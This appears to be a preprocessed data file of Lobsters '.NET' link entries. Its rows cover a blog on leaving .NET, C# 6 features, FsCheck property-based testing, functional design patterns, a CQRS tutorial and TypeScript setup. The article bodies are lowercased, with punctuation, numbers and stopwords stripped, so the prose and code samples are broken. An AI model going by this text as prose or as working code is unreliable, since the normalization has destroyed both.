typically fighting bug implementation fortunately uncomfortable downloading source finding problem issuing pull request recompiling linux done exact thing time care remember course clr massive beast getting identical behavior different o unofficial implementation nothing short miracle akin parting red sea fact spend much time hunting standard library bug get code behave correctly difficult justify certain area mono also slow perhaps slow every capacity web server one critical piece dog slow dead last bottom pack slow even trivial stuff suppose good news get better also mention mono guy forgotten linux probably ever know ca nt critical ii perhaps ii trying many thing many application gone web server application host similar application container also slow side guess needed higher performance code web server really like focus application code instead would nice utilize evented web server window nginx server nt like window production various jvmbased implementation netty easily per second ii choke per second running simple clr hello world application funny aside guy referenced benchmark created simple c web server tcp socket request per second closemindedness movement year back called altnet movement looking outside broader development community whole bringing together different part interestingly enough inspiration structuremap autofac nuget aspnet mvc many tool came movement viewed lot disdain contempt within traditional net circle see huge evidence inertia general closemindedness community whole granted may dissipating different technology emerge including redis mongodb among others many great solution assume microsoft ordained one true way absurd case still using visual designer visual studio drag drop button link element onto webform surface wire button rely aspnet viewstate help insulate u horror scary http day got rid last webform one deployed code base day glorious celebration literally ever thought web control good idea apparently drank koolaid embraced fullest bit hard ever seen viewstate note composing post originally titled left net meaning entire net ecosystem title felt little short updated left net framework consider net ecosystem including tool project platform organization group developer element wider net community come fire post performance killer typical multithreaded paradigm c java c strongly encourages use lock mutexes hidden cost lock painfully slow using disruptor lockfree ring buffer jvm easily process event per second net using ordained best practice anything dozen transaction per second considered decenttogood performance point need biggerbettermore hardware fact seen thirdparty client library rabbit couch mongo etc lock statement code even nt concurrency code default preferred method using lock lockfree eventdriven approach allows reduce hardware capital outlay massive degree application could easily run two machine second necessary redundancy failover case first machine became unavailable due hardwarerelated issue another aspect traditional way calling network disk subsystem synchronous blocking code want multiple concurrent http request need thread developer never bothered understand overhead needed maintain thread requirement context switch thread cause cpu core spend time thrashing context switch instead real work got hundred thousand thread application tying ram causing cpu spin wheel better way nettynio jvm erlang node gevent python go encourage use eventbased subsystem operation selectepollkqueue mean cpu free actual work waiting packet txrx across network netty arguably fastest task maturity jvm love way go handle goroutines simple elegant easy reason without callback spaghetti sql server net developer start new project thing typically hand course create new solution add team foundation server create corresponding website entry ii create new sql server database associate entity framework solution typically project created start designing database activerecord entity nt right way code case sure may work scenario default architecture want made technology choice even understand problem domain literally put cart horse microsoft ecosystem encourages everyone utilize sql server incredibly easy interact sql server within visual studio using sql management studio predecessor sql query analyzer databasecentric focus part ordained one true way get hooked microsoft even vendor lockin always good vendor develop way nt considering behavior application stored project utilize jsonbased keyvalue store capability choose storage engine want including sql server oracle postgresql mysql cassandra couchdb couchbase dynamo simpledb riak berkeleydb firebird hypertable ravendb redis tokyo cabinettyrant azure blob plaintext json file file system etc etc etc sudden start choosing storage engine based upon merit rather familiarity aside ever run sql server cloud aws rds nt sure work simplest thing like replication nt exist doc littered reference capability sql server nt work within aws rds conclusion perhaps two important lesson learned software development importance boundary encapsulation various form paying price get model abstraction right year ago hated word model everyone would throw around overloaded term hard understand meant important point say model narrow representation reality trying encapsulate perhaps simplest example mercator projection globe good exactly one thing navigation use anything else le worthless focused paying price get model right encapsulate business reality amount technology save biggest beef net one true way lead away ideal model push toward focusing implementation detail technology default kind focus result technical implementation bleeding infecting model ultimately cause decay deteriorate ca nt adapt everchanging business requirement happens developer struggle kick move one new technology another like drug addict hoping next big thing cure ailment technology nt panacea instead tradeoff choice correct understanding business behavior encapsulation wellformed wellunderstood model help keep technology stack belongs implementation detail left net framework kept reasserting wanting implementation detail
534,Lobsters,dotnet,"C#, F#, .NET programming",Essential C# 6 Features You Need to Know!,http://developer.telerik.com/featured/essential-c-6-features-you-need-to-know/,essential c feature need know,github static using syntax autoproperty initializers dictionary initializers string interpolation nameof expression name newname expression bodied function property exception filter await catch finally block null conditional operator wrapup msdn devcraft,final version c released seen lot syntax change occurred since inception noticed blog post currently internet nt work anymore vague implemented feature thought would useful make list essential c feature simple code example would make easy understand simple copypaste sample new console app try let jump complete visual studio console application demo shown article found github static using syntax previous version c wanted print something console would write following line code using system namespace csharpsix class program static void main string args consolewriteline hello world c add using static qualifier reference writeline method shown using static systemconsole namespace csharpsix class program static void main string args writeline hello world also work class created take look following example using static systemconsole using static csharpsixyetanotherclass namespace csharpsix class program static void main string args writeline hello world helloback static class yetanotherclass public static void helloback writeline hello computer since declared yetanotherclass static keyword run method calling method name output sample would hello world hello computer autoproperty initializers past may created property getter setter initialized constructor value shown using system namespace csharpsix class program static void main string args customer cust new customer consolewriteline custcustomerid consolereadline public class customer public customer customerid guidnewguid public guid customerid get set modify customer class populate property called customerid inline initialization c using system using static systemconsole namespace csharpsix class program static void main string args customer cust new customer writeline custcustomerid readline public class customer public guid customerid get set guidnewguid output sample random guid generated system dictionary initializers c would initialize dictionary key value syntax example using systemcollectionsgeneric namespace csharpsix class program static void main string args var star new dictionary string string michael jordon basketball peyton manning football babe ruth baseball foreach keyvaluepair string string keyvaluepair star consolewriteline keyvaluepairkey keyvaluepairvalue n consolereadline c place key two square bracket key set value key key value syntax cleaner opinion reduces amount error old way produced using systemcollectionsgeneric using static systemconsole namespace csharpsix class program static void main string args var star new dictionary string string michael jordan basketball peyton manning football babe ruth baseball foreach keyvaluepair string string keyvaluepair star writeline keyvaluepairkey keyvaluepairvalue n readline string interpolation prior c typically concatenated two string together one following method using system namespace csharpsix class program static void main string args string firstname michael string lastname crump consolewriteline name firstname lastname consolewriteline name firstname lastname consolereadline c cleaner way format string writing argument instead referring placeholder make sure use start string using static systemconsole namespace csharpsix class program static void main string args string firstname michael string lastname crump writeline firstname lastname name readline output example michael crump name nameof expression feature designed due large amount code many enterprise level application one common error using hardcoded name string error message due nature apps general refactoring sometimes name change string representation left alone thus breaking app one example using system using static systemconsole namespace csharpsix class program static void main string args dosomething hi readline public static void dosomething string name name null throw new exception name null code produce error expected string equal null happens someone change name variable newname since hardcoded name null error appear enduser would rather say newname null compiler recognize mistake c refactor code remove string literal use nameof expression using system using static systemconsole namespace csharpsix class program static void main string args dosomething hi readline public static void dosomething string newname newname null throw new exception nameof newname null result cleaner code type safety retrieving member name case removed newname variable gave new name compiler would catch error program executed expression bodied function property function property lambda expression save defining function property statement block take note multiplenumbers function using static systemconsole namespace csharpsix class program private static double multiplynumbers double double static void main string args double double writeline multiplynumbers readline result program would shorthand notation may confusing first think get used make program much readable exception filter exception filter supported visual basic new c compiler allow specify condition catch block typically used following c using system using static systemconsole namespace csharpsix class program static void main string args var httpstatuscode write http error try throw new exception httpstatuscodetostring catch exception ex exmessageequals write bad request else exmessageequals write unauthorized else exmessageequals write payment required else exmessageequals write forbidden else exmessageequals write found readline rather entering catch block checking see condition met exception decide even want enter specific catch block using system using static systemconsole namespace csharpsix class program static void main string args var httpstatuscode write http error try throw new exception httpstatuscodetostring catch exception ex exmessageequals write bad request readline catch exception ex exmessageequals write unauthorized readline catch exception ex exmessageequals write payment required readline catch exception ex exmessageequals write forbidden readline catch exception ex exmessageequals write found readline readline await catch finally block brand new c write asynchronous code inside catchfinally block help developer often need log exception file database without blocking current thread example one would work using system using systemnethttp using systemthreadingtasks using static systemconsole namespace csharpsix class program static void main string args taskfactorystartnew getpage readline private async static task getpage httpclient client new httpclient try var result await clientgetstringasync http wwwtelerikcom writeline result catch exception exception try asynchronous request run first request failed var result await clientgetstringasync http wwwprogresscom writeline result catch writeline entered catch block finally writeline entered finally block null conditional operator every developer hate nullreferenceexception error typical code one would check prior c using system using static systemconsole namespace csharpsix class program static void main string args person person new person personname stringempty person null writeline person null personname field null readline public class person public string name get set return field null enter data name console print whatever contained name using c use check instance null code listing print personname field one supplied print field null one nt supplied using system using static systemconsole namespace csharpsix class program static void main string args person person new person personname stringempty person null writeline person name field null readline public class person public string name get set wrapup thankfully c final used production environment nt able touch every feature always reference msdn info would also encourage check included visual studio case wondering ui component included devcraft fully functional visual studio hopefully use cool new c feature wrote today miss cool feature better way something sound comment
535,Lobsters,dotnet,"C#, F#, .NET programming",An introduction to property-based testing,http://fsharpforfunandprofit.com/posts/property-based-testing/,introduction propertybased testing,f advent calendar english slide video part post cousin might heard writing minimal code make test pas transformation priority beating malicious programmer property based testing refactoring common code reviewing done far addition wikipedia specification property used sort specification specification example introducing quickcheck fscheck using fscheck test addition property using fscheck find unsatified property return malicious edfh understanding fscheck generator understanding fscheck generating sort type automatically understanding fscheck shrinking configuring fscheck changing number test configuring fscheck verbose mode logging adding precondition naming convention property combining multiple property combining propertybased test examplebased test using fscheck nunit summary come property apply code create generator shrinkers modelbased testing available github want written follow post choosing property propertybased testing slide video appendix installing troubleshooting fscheck currently appropriate binding redirects comment comment powered disqus blog comment powered,post part f advent calendar english project check great post special thanks sergey tihon organizing update talk propertybased testing based post slide video part post discus choose property propertybased testing start discussion hope never coworker need function add two number together would mind implementing short time later coworker finished implementing add function great written unit test coworker want test well roll eye ok short time later coworker wrote test look given expect output coworker call done well one test know nt fail input coworker ok let another one short time later coworker wrote another awesome test given expect output yes still testing special case know nt fail input nt thought coworker want even test mutter slavedriver breath walk away seriously imaginary complaint validity many test enough imagine rather developer test engineer responsible testing function implemented correctly unfortunately implementation written burnedout always lazy often malicious programmer call enterprise developer hell edfh cousin might heard practising testdrivendevelopment enterprisestyle mean write test edfh implement code pass test start test like using vanilla nunit style test let add expect let result add assertareequal result edfh implement add function like let add x else test pass complain edfh say tdd properly writing minimal code make test pas fair enough write another test test let add expect let result add assertareequal result edfh change implementation add function let add x else else complain edfh point approach actually best practice apparently called transformation priority point start thinking edfh malicious backandforth could go forever beating malicious programmer question kind test could write malicious programmer could create incorrect implementation even wanted well could start much larger list known result mix bit test let add two number expect get sum x expected let actual add x assertareequal expected actual edfh tireless update implementation include case well much better approach generate random number use input malicious programmer could possibly know advance let rand systemrandom let randint randnext test let add two random number expect sum let x randint let randint let expected x let actual add x assertareequal expected actual test look like edfh forced implement add function correctly one final improvement edfh might get lucky picked number work chance repeat random number test number time say time test let add two random number time expect sum let x randint let randint let expected x let actual add x assertareequal expected actual done property based testing one problem order test add function making use function word using one implementation test another case acceptable see use following post general bad idea test duplicate code testing waste time effort two implementation build keep date test using test answer create test focus property function property thing true correct implementation think property add function one way getting started think add differs similar function example difference add subtract well subtract order parameter make difference add good property start depend addition eliminate whole class incorrect implementation test let add two number result depend parameter order let x randint let randint let add x let add x reversed params assertareequal good start stop edfh edfh could still implement add using x test would pas difference add multiply addition really mean could start testing something like say x x x let add x x let x assertareequal assuming existence multiplication define property depends add one useful approach see happens function repeated add add result lead idea two add one add test test let adding twice adding let x randint let randint let x add add let x add assertareequal great add work perfectly test multiply however note edfh could still implement add using x test would pas luckily test well combination test narrow one correct implementation surely submitting test suite find edfh written implementation pass test look let add x malicious implementation aarrghh happened approach go wrong well forgot force implementation actually use random number generating need ensure implementation indeed something parameter passed going check result somehow connected input specific way trivial property add know answer without reimplementing version yes happens add zero number always get number back test let adding zero nothing let x randint let x add let x assertareequal set property used test implementation add force edfh create correct implementation refactoring common code quite bit duplicated code three test refactoring first write function called propertycheck work generating pair random ints propertycheck also need parameter property function take two ints return bool let propertycheck property property type int int bool let x randint let randint let result property x assertistrue result place redefine one test pulling property separate function like let commutativeproperty x let add x let add x reversed params test let add two number result depend parameter order propertycheck commutativeproperty also thing two property refactoring complete code look like let rand systemrandom let randint randnext let add x x correct implementation let propertycheck property property type int int bool let x randint let randint let result property x assertistrue result let commutativeproperty x let add x let add x reversed params test let add two number result depend parameter order propertycheck commutativeproperty let x let x add add let x add test let adding twice adding propertycheck let identityproperty x let x add x test let adding zero nothing propertycheck identityproperty reviewing done far defined set property implementation add satisfy parameter order matter property add twice add adding zero nothing property nice property work input special magic number importantly show u core essence addition fact take approach logical conclusion actually define addition anything property exactly mathematician look addition wikipedia see defined entirely term commutativity associativity identity note experiment missed defining instead created weaker property see later edfh indeed write malicious implementation satisfies property associativity better ala hard get property perfect first attempt even using three property came got much higher confidence implementation correct fact learned something understood requirement deeper way specification property collection property like considered specification historically unit test well functional test used sort specification well approach specification using property instead test data alternative think often shorter le ambiguous might thinking mathematical kind function specified way future post see approach used test web service database course every business requirement expressed property like must neglect social component software development specification example domain driven design play valuable role working nontechnical customer also might thinking designing property lot work right hardest part followup post present tip coming property might reduce effort somewhat even extra effort involved upfront technical term activity called way overall time saved automated test unambigous specification pay upfront cost later fact argument used promote benefit unit testing equally well applied propertybased testing tdd fan tell time come propertybased test might looking big picture introducing quickcheck fscheck implemented property checking system quite problem work integer function would nice could use approach function string parameter fact type parameter including one defined work two parameter function ignore one identity property would nice could use approach function number parameter counterexample property know helpful test fail logging random number generated way set seed mean debug reproduce error easily configurable example easily change number loop something else would nice framework u thankfully library originally developed haskell koen claessen john hughes ported many language version quickcheck used f c excellent library created kurt schelfthout although based haskell quickcheck nice additional feature including integration test framework nunit xunit look fscheck would thing homemade propertytesting system using fscheck test addition property first need install fscheck load dll fscheck bit finicky see bottom page instruction troubleshooting top script file look something like systemiodirectorysetcurrentdirectory sourcedirectory use older version r fscheckdll r nunitframeworkdll open system open fscheck open nunitframework fscheck loaded use checkquick pas function say function function parameter return boolean let add x x correct implementation let commutativeproperty x let add x let add x reversed params check property interactively checkquick commutativeproperty let x let x add add let x add check property interactively checkquick let identityproperty x let x add x check property interactively checkquick identityproperty check one property interactively say checkquick commutativeproperty see message using fscheck find unsatified property see happens malicious implementation add code edfh implement add multiplication implementation satisfy commutative property let add x x malicious implementation let x let x add add let x add check property interactively checkquick result fscheck falsifiable test shrink stdgen mean using input result false easily see return malicious edfh using random testing made harder malicious implementor change tactic edfh note still using magic number namely decides create implementation exploit use correct implementation low input value incorrect implementation high input value let add x x x correct low value else x incorrect high value oh retest property pas teach u use magic number test alternative well steal mathematician create associative property test let associativeproperty x z let add x add z x z let add add x z x z check property interactively checkquick associativeproperty aha get falsification falsifiable test shrink stdgen mean using note fscheck found input break property found lowest example know input pas going one higher fails nice understanding fscheck generator used fscheck real pause look work first thing fscheck generate random input called type associated generator example generate list sample data use generator along two parameter number element list precise meaning depends type generated context example thing used maximum value int length list depth tree etc code generates ints get generator ints let intgenerator arbgenerate int generate three ints maximum size gensample intgenerator eg generate three ints maximum size gensample intgenerator eg generate three ints maximum size gensample intgenerator eg example ints generated uniformly clustered around zero see little code see value clustered around center point intgenerator gensample seqgroupby id seqmap fun k v k seqlength v seqsortby fun k v k seqtolist result something like see value center generated time generated time outlying value rare generated time repeat larger sample one generates element range intgenerator gensample seqgroupby id seqmap fun k v k seqlength v seqsortby fun k v k seqtolist plenty generator function available well gensample documentation understanding fscheck generating sort type automatically great generator logic automatically generate compound value well example generator tuple three ints let tuplegenerator arbgenerate int int int generate tuples maximum size gensample tuplegenerator result generate tuples maximum size gensample tuplegenerator result generate tuples maximum size gensample tuplegenerator result generator base type option list generator follow generator int option let intoptiongenerator arbgenerate int option generate int option maximum size gensample intoptiongenerator result null generator int list let intlistgenerator arbgenerate int list generate int list maximum size gensample intlistgenerator result course generate random string let stringgenerator arbgenerate string generate string maximum size gensample stringgenerator result generate string maximum size gensample stringgenerator result eix u r best thing generator work userdefined type type color red green int blue bool let colorgenerator arbgenerate color generate color maximum size gensample colorgenerator result green red red red blue true green blue false red blue true green one generates userdefined record type containing another userdefined type type point x int int color color let pointgenerator arbgenerate point generate point maximum size gensample pointgenerator result x color green x color green x color red x color red x color red etc way finegrained control type generated wait another post understanding fscheck shrinking creating minimum counterexample one cool thing quickcheckstyle testing two part process fscheck us first generates sequence random input starting small getting bigger phase described input cause property fail start first parameter find smaller number exact process shrinking varies depending type override say number get smaller sensible way example say silly property let x x generated random number found property fails want try smaller number arbshrink generate sequence ints smaller one tried property turn property fails false start shrinking arbshrink seqtolist element list test property find another failure true true true false shrink property failed shrink using starting point arbshrink seqtolist true true true true false shrink property failed shrink using starting point arbshrink seqtolist smallest failure shrink property failed shrink using starting point arbshrink seqtolist smallest failure point shrinking work smaller value found case fscheck report falsifies property shrink needed generator fscheck generate shrink sequence almost type arbshrink seqtolist arbshrink abcd seqtolist bcd acd abd abc abca abcb abcc abad abbd aacd arbshrink seqtolist generator way customize shrinking work needed configuring fscheck changing number test mentioned silly property see fscheck silly property test let x x checkquick result ok passed test oh dear fscheck find counterexample point try thing first try increasing number test changing default configuration field called maxtest set default increase finally use specific config need use checkone config property rather checkquick property let config configquick maxtest checkone config result ok passed test oops fscheck find counterexample test either try test let config configquick maxtest checkone config result falsifiable test shrink stdgen ok finally got work take many test answer lie configuration setting startsize endsize remember generator start small number gradually increase controlled startsize endsize setting default startsize endsize end test parameter generator saw even size number generated extreme case mean number greater unlikely generated change endsize something larger see happens let config configquick endsize checkone config result falsifiable test shrink stdgen like test needed rather test configuring fscheck verbose mode logging mentioned one benefit fscheck homegrown solution logging reproducibility look tweak malicious implementation boundary see fscheck detects boundary via logging let add x x x correct low value else x incorrect high value let associativeproperty x z let add x add z x z let add add x z x z check property interactively checkquick associativeproperty result falsifiable test shrink stdgen fscheck found exact boundary point quite quickly first simplest way see fscheck use mode use checkverbose rather checkquick check property interactively checkquick associativeproperty tracinglogging checkverbose associativeproperty see output like shown added comment explain various element test param param param associativeproperty true keep going test associativeproperty true keep going test associativeproperty true keep going test associativeproperty true keep going etc test associativeproperty false start shrinking etc shrink associativeproperty false keep shrinking shrink associativeproperty false keep shrinking etc shrink associativeproperty false keep shrinking shrink associativeproperty false keep shrinking next shrink fails falsifiable test shrink stdgen display take lot space make compact yes control test shrink displayed writing custom function telling fscheck use via config structure function generic list parameter represented list unknown length obj list since know testing three parameter property hardcode threeelement list parameter print one line configuration also slot called replay normally none mean run different set replay seed test replayed exactly way seed look like stdgen someint someint printed run want preserve run need paste seed config use specific config need use checkone config property rather checkquick property code default tracing function changed replay seed set explicitly create function displaying test let printtest testnum x z sprintf testnum x z create function displaying shrink let printshrink x z sprintf shrink x z create new fscheck configuration let config configquick replay randomstdgen every printtest everyshrink printshrink check given property new configuration checkone config associativeproperty output much compact look like etc start shrinking first parameter shrink shrink shrink shrink start shrinking second parameter shrink shrink shrink start shrinking third parameter shrink shrink shrink falsifiable test shrink stdgen go quite easy customize fscheck logging need look shrinking done detail last set input false shrinking started last set input false shrinking started associativeproperty false shrink list possible shrink starting arbshrink seqtolist result loop list stopping first element cause property fail find next test fails shrinking x parameter let x z arbshrink x seqtrypick fun x associativeproperty x z none else x z answer first element caused failure part input start shrink find next test fails shrinking x parameter let x z arbshrink x seqtrypick fun x associativeproperty x z none else x z answer first element caused failure part input start keep going find next test fails shrinking x parameter let x z arbshrink x seqtrypick fun x associativeproperty x z none else x z answer find next test fails shrinking x parameter let x z arbshrink x seqtrypick fun x associativeproperty x z none else x z answer find next test fails shrinking x parameter let x z arbshrink x seqtrypick fun x associativeproperty x z none else x z answer none point low go none shrink sequence caused failure finished x parameter repeat process parameter find next test fails shrinking parameter let x z arbshrink seqtrypick fun associativeproperty x z none else x z answer find next test fails shrinking parameter let x z arbshrink seqtrypick fun associativeproperty x z none else x z answer find next test fails shrinking parameter let x z arbshrink seqtrypick fun associativeproperty x z none else x z answer find next test fails shrinking parameter let x z arbshrink seqtrypick fun associativeproperty x z none else x z answer none point low go none shrink sequence caused failure finished parameter finally repeat process z parameter find next test fails shrinking z parameter let x z arbshrink z seqtrypick fun z associativeproperty x z none else x z answer find next test fails shrinking z parameter let x z arbshrink z seqtrypick fun z associativeproperty x z none else x z answer find next test fails shrinking z parameter let x z arbshrink z seqtrypick fun z associativeproperty x z none else x z answer find next test fails shrinking z parameter let x z arbshrink z seqtrypick fun z associativeproperty x z none else x z answer none finished parameter final counterexample shrinking adding precondition say new idea property check create property called addition multiplication help stop malicious even accidental mixup implementation first attempt let additionisnotmultiplication x x x bt run test get failure checkquick additionisnotmultiplication falsifiable test shrink stdgen well duh obviously equal tell fscheck ignore input leave one alone done via filter expression prepended property function using operator defined fscheck example let additionisnotmultiplication x x x let precondition x x let additionisnotmultiplicationwithprecondition x precondition x additionisnotmultiplication x new property additionisnotmultiplicationwithprecondition passed checkquick like property checkquick additionisnotmultiplicationwithprecondition falsifiable test shrink stdgen oops forgot another case fix precondition let precondition x x x let additionisnotmultiplicationwithprecondition x precondition x additionisnotmultiplication x work checkquick additionisnotmultiplicationwithprecondition ok passed test kind precondition used want filter small number case input invalid filtering expensive case better way discussed future post fscheck documentation tweak property naming convention property property function different purpose function name haskell erlang world property given prop prefix convention net world common use suffix like abcproperty also f namespaces module attribute like test use organize property distinguish function combining multiple property set property combine group even gasp specification adding static member class type checkquickall pas name class example three addition property let add x x good implementation let commutativeproperty x add x add x let associativeproperty x z add x add z add add x z let leftidentityproperty x add x x let rightidentityproperty x add x x corresponding static class used checkquickall type additionspecification static member commutative x commutativeproperty x static member associative x z associativeproperty x z static member left identity x leftidentityproperty x static member right identity x rightidentityproperty x checkquickall additionspecification combining propertybased test examplebased test beginning post dismissive test used number test small part input space however think examplebased test role complement propertybased test examplebased test often easier understand le abstract provides good entry point documentation conjunction property example type additionspecification static member commutative x commutativeproperty x static member associative x z associativeproperty x z static member left identity x leftidentityproperty x static member right identity x rightidentityproperty x example well static member add static member add add static member add add using fscheck nunit use fscheck nunit test framework extra plugin eg fschecknunit nunit rather marking test test fact use property attribute unlike normal test test parameter example test open nunitframework open fscheck open fschecknunit property quietonsuccess true let commutative x commutativeproperty x property verbose true let associative x z associativeproperty x z property let left identity x leftidentityproperty x see change configuration test verbose endsize via property annotation quietonsuccess flag available make fscheck compatible standard test framework silent success show message something go wrong summary post introduced basic propertybased checking much cover though future post cover topic come property apply code property mathematical look general property inverse testing serializationdeserialization idempotence safe handling multiple update duplicate message also look test oracle create generator shrinkers seen fscheck generate random value nicely value constraint positive number valid email address phone number fscheck give tool build modelbased testing particular test concurrency issue also introduced notion evil malicious programmer might think malicious programmer unrealistic overthetop many case act like unintentionally malicious programmer happily create implementation work special case work generally evil intent unawareness blindness like fish unaware water often unaware assumption make propertybased testing force u become aware next time happy testing code sample used post available github want written follow post choosing property propertybased testing update talk propertybased testing based post slide video appendix installing troubleshooting fscheck easiest way make fscheck available create f project add nuget package install fscheck nunit package directory using fsx script file interactive development need load dlls appropriate package location like set current directory script directory systemiodirectorysetcurrentdirectory sourcedirectory assumes nuget install fschecknunit run assembly available current directory use older version r fscheckdll r nunitframeworkdll open system open fscheck open nunitframework next test fscheck working correctly running following let revrevisorig x list int listrev listrev x x checkquick revrevisorig get error everything good get error probably older version visual studio upgrade failing following first make sure latest f core installed currently make sure appconfig appropriate binding redirects make sure nunit assembly referenced locally rather gac step ensure compiled code work f interactive trickier using might run error systeminvalidcastexception unable cast object type arrow best cure upgrade failing use older version fscheck tested successfully comment please enable javascript view comment powered disqus blog comment powered
536,Lobsters,dotnet,"C#, F#, .NET programming",Functional Programming Design Patterns,http://fsharpforfunandprofit.com/fppatterns/,functional programming design pattern,view youtube video slide longer version slide domain modeling made functional book wrote post comment comment powered disqus blog comment powered,page contains link slide code talk programming design view youtube blurb objectoriented development familiar design pattern strategy pattern decorator pattern design principle solid functional programming community design pattern principle well talk provide overview present demonstration fp design practice video video recorded ndc london click image view video hour long whiz fast talk london f meetup january time question talk went bit slower result two hour long slide slide used ndc london also longer version slide well like way explaining thing picture take look domain modeling made functional book friendly introduction domain driven design modeling type functional programming talk buildstuff one particular slide got retweeted lot ala got misinterpreted profp antifp people even uncle bob wrote post oh dear humor work context ndc skill matter version talk decided make clearer making fun fp people live ivory tower hope enjoy talk comment please enable javascript view comment powered disqus blog comment powered
537,Lobsters,dotnet,"C#, F#, .NET programming","DDD, Event Sourcing, and CQRS Tutorial: design",http://cqrs.nu/tutorial/cs/01-design,ddd event sourcing cqrs tutorial design,part design tutorial domain tab opened order drink served food prepared served order amend close event thing happen new information past tense command request accepted rejected user considers operation verb imperative mood exception tell ask explain aggregate particular tab aggregate root identify segregate business concept really focus consistency boundary moving forward,part designabout tutorialthis tutorial demonstrates using edument cqrs starter kit order build domain logic complete test also see read model built finally use domain logic read model small aspnet mvc applicationthe tutorial work towards cafe sample application included kit therefore may like open refer work tutorialthe domainfor tutorial work cafe domain focus concept tab track visit individual group cafe people arrive cafe take table tab opened may order drink food drink served immediately table staff however food must cooked chef chef prepared food servedduring time restaurant visitor may order extra food drink realize ordered wrong thing may amend order food drink served accepted themfinally visitor close tab paying owed possibly tip serving staff upon closing tab must paid full tab unserved item closed unless item either marked served cancelled firsteventsin scenario described various verb noun picked working databasecentric way common listen carefully noun mapping table relating verb thus often secondary concern designing term command event put focus verb instead noun considered little later good since thing make domain interesting tend captured verb rather noun every business customer hopefully matterslooking scenario focusing language find within look thing happen lead kind new information domain map happening set event since event thing taken place named past tensehere set event may come cafe tab scenariotabopeneddrinksorderedfoodordereddrinkscancelledfoodcancelleddrinksservedfoodpreparedfoodservedtabclosednote event domainfocused difference ordering drink ordering food matter capture different event also note verb domain generic term like created updated deleted event nt automatically wrong form majority time look deeper domain escape crudthink maybe nt complex enough warrant applying ddd case something cheapercommandscommands thing indicate request domain event state something certainly happened command may accepted rejected accepted command lead zero event emitted incorporate new fact system rejected command lead kind exceptioncommands also identified looking verb however focused around user considers operation example important food drink handled differently domain table staff certainly want enter drink system order separately enter food system way get overview order placed likely person table specify food drink together somebody probably change mind learning friend order therefore single command placing orderhere initial command arrive domain opentabplaceorderamendordermarkdrinksservedmarkfoodpreparedmarkfoodservedclosetabnotice name include verb imperative moodexceptionsan important part modeling process thinking thing cause command refused edument cqrs starter kit decidedly opinionated expected model sad path exception type command event expressed dtos furthermore exception type may carry detail request acceptable domain logic tell frontend wrong rather leaving ask trying inspect state worse leave user guesslooking scenario identify three notable exception need model cannotcancelserveditemtabhasunserveditemsmustpayenoughthe name try explain command failedaggregatesof course man live verb alone point must noun concretely way talk current state order decide command accepted example refuse cancel served item know servedall information need captured stream past event since capture fact introduced system however general intersted whole stream instead interested event relate example particular tab tab event streamthe missing piece known aggregate aggregate stream event taken together used compute current state aggregate completely isolated decision whether accept command made solely basis command information contained aggregate past eventsconcretely aggregate either single object nt reference othersan isolated graph object one object designated root aggregate outside world know rootthis demanding design perspective force u identify segregate business concept also mean really focus consistency boundariesour current example carefully selected one aggregate type namely tab however system work order identify aggregate author tutorial found starting event command trying group based invariant business rule need uphold good strategymoving forwardswe ready start writing test case building domain logic ready revisit aspect design also need flesh detail command event contain
538,Lobsters,dotnet,"C#, F#, .NET programming",TypeScript with Visual Studio 2015,http://developer.telerik.com/featured/typescript-with-visual-studio-2015/,typescript visual studio,typescript nativescript appbuilder angular typescript open source language specification guide official blog installing typescript package sublime text webstorm visual studio code web browser playground compiler typescript definition file compiler typescript definition file github repository use repo using typescript visual studio web essential let get work syntax basic function optional typing interface debugging class keep calm learn,typescript used everywhere internal project like nativescript appbuilder adoption google angular come surprise javascript going hard avoid future exactly typescript use added benefit typescript typescript typed superset javascript compiles plain javascript work everywhere open source offer class module interface along powerful tooling static checking refactoring statement completion easiest way learn read language specification guide follow official blog installing typescript run typescript window linux mac using window updated visual studio ready go without installing additional software using visual studio need install package using mac make sure nodejs npm installed enter following command npm install g typescript system ready run latest version typescript ide editor use thankfully vast variety option besides visual studio sublime text webstorm visual studio code even web browser playground option tutorial working visual studio compiler typescript definition file compiler using one supplied ides editor mentioned earlier wo nt step good know compile typescript file javascript file following command tsc scriptts file called scriptjs created folder ran tsc would like see list command currently available use tsc shown c program file microsoft visual studio tsc version syntax tsc option file example tsc hellots tsc filejs filet tsc argstxt give version number typescript installed example sytax take note using parameter shown compile multiple typescript file single file command manually run since using typescript one might help typescript definition file statement completion intellisence microsoft world come handy writing web app thankfully typescript already support standard syntax thirdparty library jquery angular backbone would nt like statement completion library well gratefully github repository type definition common javascript library use going use standard jquery library example navigate repo download jquerydts file add project along latest jquery build open typescript file add following code reference path typingsjqueryjquerydts declare var jquerystatic var onclicked function alert clicked var main function greet click onclicked document ready function main add html page include following code inside body tag body input id greet value hello type button body typescript file reference definition file first downloaded github repo declare var jquerystatic interface later give u code completion throughout typescript file next use familiar syntax jquery get id html page called greet add click event handler page load click button alert appears example added code completion thirdparty library used familar jquery syntax typescript file let switch visual studio start first project using typescript visual studio regardless ide editor installed going take look typescript would benefit development team however example going using visual studio proceeding recommend installing web essential make working web project much easier get started select language typescript finally html application typescript look visual studio stubbed u see following using visual studio automatically create local web server compile t typescript file javascript load indexhtml press run button go ahead run come back solution notice generated javascript file showing solution select project click button say show file shown order see generated javascript file alongside typescript file going dock typescript file lefthand panel javascript file righthand panel dragging j file center screen dock appear make change typescript file simply press ctrls save javascript file update automatically shown could use watch command shown compiler section update file automatically keep thing simple development environment setup correctly favorite part coding note earlier version web essential would allow splitscreen view automatically latest release currently way get splitscreen view let get work syntax basic dig typescript let start basic open ide editor type following two line var name michael crump name using type inference string since declared string var fullname string michael crump fullname using type annotation declared string reading comment see using type inference first example type annotation second since used string annotation thing said number booleans array etc var num var bignumber number declare variable nt set data like following var something see type type variable may know writing application later application could change type var something something michael crump string something number evaluate something variable code executed evaluate function optional typing already working optional typing need start tying together function see full potential add following function see looking string passed return michael crump method called function helloperson string return return michael crump helloperson name typing function get code completion let create another function called addnumbers pas following parameter without specifying type function addnumbers return addnumbers name something result would clearly nt looking wanted add two number together revised code sample added type shown yellow would caught error ide rather concatenating string number shown earlier example look like browser change name number following wo nt see error addnumbers something interface used interface already typescript definition file let look could beneficial creating short interface describe type class function deal implementation interface help u keep program errorfree ide editor providing information shape data going work add following code typescript file interface book title string author string bookinfo string var b book title moby dick author herman melville bookinfo function return thistitle thisauthor var book bbookinfo alert book declared interface called book given title author well function declare b variable use book interface enter information title author well function return run last two line code see moby dick herman melville could change title author simply providing following two line code btitle romeo juliet bauthor william shakespeare see syntax highlighting code completion well ability tell type using automatically correct error fly debugging default mapping file created allows u debug typescript application look folder t j reside find map file let go ahead put break point return line inspect local window see value property runtime class think class container different member application contain field constructor 